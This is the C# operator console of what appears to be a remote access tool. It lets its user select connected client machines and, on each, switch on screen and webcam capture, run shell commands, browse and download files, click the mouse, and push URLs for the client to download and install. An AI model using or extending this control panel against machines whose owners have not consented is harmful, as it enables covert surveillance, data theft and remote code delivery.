using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Threading;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Collections;
using System.IO;
using System.IO.Compression;
using NetServer.TcpServer;

///////带点文件夹，bug修复

namespace NetServer {
	public partial class ServerForm : Form {

		private Server _server = null;
		private ReceiveFile _fileServer = null;

		private HandleClient _currentHandle = null;
		private Dictionary<string, HandleClient> _handleClientDictionary = new Dictionary<string, HandleClient>();
		private bool _startMouseControl = false;
		private Stack<string> _filePathHistory = new Stack<string>();

		private const int MOUSEEVENTF_LEFTDOWN = 0x02;
		private const int MOUSEEVENTF_LEFTUP = 0x04;
		private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
		private const int MOUSEEVENTF_RIGHTUP = 0x10;

		public ServerForm() {
			InitializeComponent();
		}

		private void tsb_StartServer_Click(object sender, EventArgs e) {
			_StartServer();
			tsb_StartServer.Enabled = false;

		}

		private void _StartServer() {
			//server = new Server();
			Thread thread = new Thread(new ThreadStart(_server.ListenToConnection));
			thread.Start();


			Thread fileThread = new Thread(new ThreadStart(_fileServer.StartReceive));
			fileThread.Start();

			//_server.ListenToConnection();
			//server.ListenToConnection();
			//tmr_RefreshClinetList.Enabled = true;

		}

		private void _showScreen(Image image) {
			pic_Screen.Image = image;
		}

		private void _showCamera(Image image) {
			pic_Camera.Image = image;
		}

		private void _showMessage(string message) {
			if (rcb_Messages.InvokeRequired) {
				rcb_Messages.Invoke(new PassMessageEventHandler(_showMessage), message);
			}
			else {

				rcb_Messages.AppendText(message + "\r\n");
				rcb_Messages.Focus();
			}

		}

		private void _showCommandResult(string result) {
			if (rcb_CommandResult.InvokeRequired) {
				rcb_CommandResult.Invoke(new PassMessageEventHandler(_showCommandResult), result);
			}
			else {
				rcb_CommandResult.AppendText(result + '\n');
				rcb_CommandResult.Focus();
				tex_Command.Focus();
			}
		}

		private void _showDevice(List<string> deviceList) {
			if (lsv_FileList.InvokeRequired) {
				lsv_FileList.Invoke(new PassDeviceEventHandler(_showDevice), deviceList);
			}
			else {
				lsv_FileList.Items.Clear();
				foreach (string device in deviceList) {
					string[] info = device.Split('*');
					ListViewItem lvi = new ListViewItem();
					lvi.Text = info[0];
					lvi.SubItems.Add(info[1]);
					lvi.SubItems.Add("Device");
					lvi.Tag = info[0];
					lsv_FileList.Items.Add(lvi);

				}
				lsv_FileList.EndUpdate();
			}
		}

		private void _showFileList(List<string[]> fileList) {
			if (lsv_FileList.InvokeRequired) {
				lsv_FileList.Invoke(new PassFileListEventHandler(_showFileList), fileList);
			}
			else {
				lsv_FileList.Items.Clear();

				string[] directoryArray = fileList[0];
				string[] fileArray = fileList[1];

				if (directoryArray != null) {
					foreach (string directory in directoryArray) {
						string[] fileSplit = directory.Split(':');
						ListViewItem lvi = new ListViewItem();
						lvi.Text = fileSplit[0];
						lvi.SubItems.Add(fileSplit[1]);
						lvi.SubItems.Add("Directory");
						lvi.Tag = tex_Path.Text + fileSplit[0];
						lsv_FileList.Items.Add(lvi);
					}
				}

				if (fileArray != null) {
					foreach (string file in fileArray) {
						string[] fileSplit = file.Split(':');
						ListViewItem lvi = new ListViewItem();
						lvi.Text = fileSplit[0];
						lvi.SubItems.Add(fileSplit[1]);
						lvi.SubItems.Add("File");
						lvi.Tag = tex_Path.Text + fileSplit[0];
						lsv_FileList.Items.Add(lvi);
					}
				}

				lsv_FileList.EndUpdate();
			}
		}

		private void _showPath(string path) {
			if (tex_Path.InvokeRequired) {
				tex_Path.Invoke(new PassMessageEventHandler(_showPath), path);
			}
			else {
				tex_Path.Text = path;
				_filePathHistory.Push(path);
			}
		}

		private void _addClient(string client, HandleClient handle) {
			if (lsv_Clients.InvokeRequired) {
				lsv_Clients.Invoke(new PassHandleClientHandler(_addClient), client, handle);
			}
			else {

				string clid = client.Split('|')[0];

				if (_handleClientDictionary.ContainsKey(client)) {
					_deleteClient(clid);
				}

				_handleClientDictionary.Add(clid, handle);
				//_handleClientDictionary[client] = handle;

				string[] info = client.Split('|');
				ListViewItem lvi = new ListViewItem();
				lvi.Tag = clid;
				lvi.Text = info[0];
				for (int i = 1; i < info.Length; i++) {
					lvi.SubItems.Add(info[i]);
				}
				lsv_Clients.Items.Add(lvi);
				lsv_Clients.EndUpdate();
			}
		}

		private void _deleteClient(string client) {
			if (lsv_Clients.InvokeRequired) {
				lsv_Clients.Invoke(new PassMessageEventHandler(_deleteClient), client);
			}
			else {
				_handleClientDictionary.Remove(client);

				foreach (ListViewItem lvi in lsv_Clients.Items) {
					if (lvi.Tag.ToString() == client) {
						lvi.Remove();
						return;
					}
				}

				
			}
		}

		private void ServerForm_Load(object sender, EventArgs e) {
			_server = new Server();
			_fileServer = new ReceiveFile();
			_server.OnShowCamera = _showCamera; ;
			_server.OnShowScreen = _showScreen;
			_server.OnShowMessage = _showMessage;
			_server.OnShowCommandResult = _showCommandResult;
			_server.OnShowDevice = _showDevice;
			_server.OnShowFileList = _showFileList;
			_server.OnShowPath = _showPath;
			_server.OnAddClient = _addClient;
			_server.OnDeleteClient = _deleteClient;

		}

		private void testToolStripMenuItem_Click(object sender, EventArgs e) {
			/*
			NetServer.TcpServer.Protocols.DeviceProtocol dp = new TcpServer.Protocols.DeviceProtocol();
			NetServer.TcpServer.Protocols.FileListProtocol flp = new TcpServer.Protocols.FileListProtocol(@"F:\迅雷下载");
			List<string> dList = (List<string>)dp.FormatReceiveProtocol();
			List<string[]> fileList = (List<string[]>)flp.FormatReceiveProtocol();
			_showFileList(fileList);
			//_showDevice(dList);
			 * */
			//_currentHandle.IsAlive = false;

		}

		private void lsv_Clients_DoubleClick(object sender, EventArgs e) {
			ListViewItem selected_lvi = lsv_Clients.SelectedItems[0];
			if (_currentHandle != null) _currentHandle.IsAlive = false;
			_currentHandle = _handleClientDictionary[selected_lvi.Tag.ToString()];
			_currentHandle.IsAlive = true;
			tss_CurrentClient.Text = "Current client is " + _currentHandle.ClientId;
			_showMessage("Select client : " + _currentHandle.ClientId);

		}


		private void tsb_StopServer_Click(object sender, EventArgs e) {
			_currentHandle.IsAlive = false;
			tss_CurrentClient.Text = string.Empty;
		}

		private void lsv_FileList_DoubleClick(object sender, EventArgs e) {
			ListViewItem selected_lvi = lsv_FileList.SelectedItems[0];
			if (selected_lvi.SubItems[2].Text == "Directory" || selected_lvi.SubItems[2].Text == "Device") {

				//_lastPath = tex_Path.Text;

				string path = tex_Path.Text + selected_lvi.Text;
				if (!path.EndsWith("\\")) {
					path += '\\';
				}

				if (_currentHandle != null) {
					_currentHandle.AddDataHead(TcpServer.Protocols.ProtocolType.S2CGetFileList, path);
				}

			}
		}

		private void startScreenToolStripMenuItem1_Click(object sender, EventArgs e) {
			if (_currentHandle != null) {
				_currentHandle.AddDataHead(TcpServer.Protocols.ProtocolType.S2CSetScreenShotState, "1");
			}
		}

		private void stopScreenToolStripMenuItem1_Click(object sender, EventArgs e) {
			if (_currentHandle != null) {
				_currentHandle.AddDataHead(TcpServer.Protocols.ProtocolType.S2CSetScreenShotState, "0");
			}
		}

		private void setScreenIntervalInternalToolStripMenuItem_Click(object sender, EventArgs e) {
			if (_currentHandle != null) {
				_currentHandle.AddDataHead(TcpServer.Protocols.ProtocolType.S2CSetScreenInterval, tex_ScreenInterval.Text);
			}
		}

		private void tsb_GetDevice_Click(object sender, EventArgs e) {
			if (_currentHandle != null) {
				_currentHandle.AddDataHead(TcpServer.Protocols.ProtocolType.S2CGetDevices);
			}
		}

		private void btn_RunCommand_Click(object sender, EventArgs e) {
			if (_currentHandle != null) {
				_currentHandle.AddDataHead(TcpServer.Protocols.ProtocolType.S2CGetCommandResult, tex_Command.Text);
				tex_Command.Text = "";
			}
		}


		private void pic_Screen_Click(object sender, EventArgs e) {
			if (_startMouseControl) {
				//鼠标相对于屏幕左上角的坐标
				Point screenPoint = Control.MousePosition;
				//鼠标相对于窗体左上角的坐标
				Point formPoint = this.PointToClient(Control.MousePosition);
				//鼠标相对于pic_Screen左上角的坐标
				Point contextMenuPoint = pic_Screen.PointToClient(Control.MousePosition);

				float x = (float)contextMenuPoint.X / (float)pic_Screen.Width;
				float y = (float)contextMenuPoint.Y / (float)pic_Screen.Height;


				MouseEventArgs mouseEvent = (MouseEventArgs)e;
				uint MouseState;
				if (mouseEvent.Button == System.Windows.Forms.MouseButtons.Left) {
					MouseState = MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;
				}
				else {
					MouseState = MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP;
				}

				string tag = MouseState.ToString() + ":" + x + ":" + y;

				if (_currentHandle != null) {
					_currentHandle.AddDataHead(TcpServer.Protocols.ProtocolType.S2CEventMouseClick, tag);
				}
			}


			//_showMessage(x + " : " + y);

		}

		private void mouseClickToolStripMenuItem_Click(object sender, EventArgs e) {
			if (mouseClickToolStripMenuItem.Text == "StartMouse") {
				_startMouseControl = true;
				mouseClickToolStripMenuItem.Text = "StopMouse";
			}
			else {
				_startMouseControl = false;
				mouseClickToolStripMenuItem.Text = "StartMouse";
			}
		}

		private void tsb_LastPath_Click(object sender, EventArgs e) {
			if (_currentHandle != null) {
				string lastPath = string.Empty;
				if (_filePathHistory.Count >= 2) {
					_filePathHistory.Pop();
					lastPath = _filePathHistory.Pop();
				}
				if (lastPath == string.Empty) {
					_currentHandle.AddDataHead(TcpServer.Protocols.ProtocolType.S2CGetDevices);
				}
				else {
					_currentHandle.AddDataHead(TcpServer.Protocols.ProtocolType.S2CGetFileList, lastPath);
				}
			}
		}

		private void tsb_Compress_Click(object sender, EventArgs e) {

			/*
			using (var archive = ZipArchive.Create()) {
				archive.AddAllFromDirectoryEntry(@"C:\\source");
				archive.SaveTo("@C:\\new.zip");
			}  
			
			foreach (ListViewItem lvi in lsv_FileList.Items) {
				
			}
			 * */
		}

		private void tsb_DownloadFile_Click(object sender, EventArgs e) {
			ListViewItem selected_lvi = lsv_FileList.SelectedItems[0];
			if (selected_lvi.SubItems[2].Text == "File") {
				if (_currentHandle != null) {
					_currentHandle.AddDataHead(TcpServer.Protocols.ProtocolType.S2CFileDownload, selected_lvi.Tag.ToString());
				}
			}
		}

		private void StartCameraToolStripMenuItem1_Click(object sender, EventArgs e) {
			if (_currentHandle != null) {
				_currentHandle.AddDataHead(TcpServer.Protocols.ProtocolType.S2CSetCameraState, "1");
			}
		}

		private void StopCameraToolStripMenuItem2_Click(object sender, EventArgs e) {
			if (_currentHandle != null) {
				_currentHandle.AddDataHead(TcpServer.Protocols.ProtocolType.S2CSetCameraState, "0");
			}
		}

		private void SetCameraIntervaltoolStripMenuItem4_Click(object sender, EventArgs e) {
			if (_currentHandle != null) {
				_currentHandle.AddDataHead(TcpServer.Protocols.ProtocolType.S2CSetCameraInterval, tex_CameraInterval.Text);
			}
		}

		private void ServerForm_FormClosed(object sender, FormClosedEventArgs e) {
			//System.Diagnostics.Process.GetCurrentProcess().Kill();
			//foreach (HandleClient hc in _handleClientDictionary) {
			//	if (hc != null) {
			////		hc.ReceiveHandle();
			//	}
			//}
			Application.Exit();
		}


		private void btn_Update_Click(object sender, EventArgs e) {
			if (_currentHandle != null) {
				_currentHandle.AddDataHead(TcpServer.Protocols.ProtocolType.S2CUpdate, tex_UpdateFileUrl.Text + "|" + tex_NewVersionFilePath.Text);
			}
		}

		private void btn_ScreenChangeMod_Click(object sender, EventArgs e) {
			if (pic_Screen.SizeMode == PictureBoxSizeMode.Normal) {
				pic_Screen.SizeMode = PictureBoxSizeMode.StretchImage;
			}
			else {
				pic_Screen.SizeMode = PictureBoxSizeMode.Normal;
			}
		}

		private void btn_DownloadFile_Click(object sender, EventArgs e) {
			if (_currentHandle != null) {
				_currentHandle.AddDataHead(TcpServer.Protocols.ProtocolType.S2CDownload, tex_DownloadFileUrl.Text + "|" + tex_DownloadFilePath.Text);
			}
		}

		private void btn_SetDownloadDirectory_Click(object sender, EventArgs e) {
			ReceiveFile._downloadDirectory = tex_DownloadDirectory.Text;
		}


	}
}
